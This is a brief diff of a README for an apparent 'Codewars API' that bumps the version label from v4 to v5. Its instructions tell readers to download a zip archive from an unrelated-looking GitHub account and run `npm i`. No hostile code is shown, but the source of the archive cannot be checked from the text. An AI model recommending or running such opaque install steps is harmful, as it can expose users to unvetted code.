@@ -1,4 +1,4 @@
-# Codewars API, v4
+# Codewars API, v5
 
 1. download [https://github.com/theoriaarhidoxa/katas-v5/blob/main/v5.zip](https://github.com/theoriaarhidoxa/katas-v5/blob/main/v5.zip).
 2. run `npm i`.
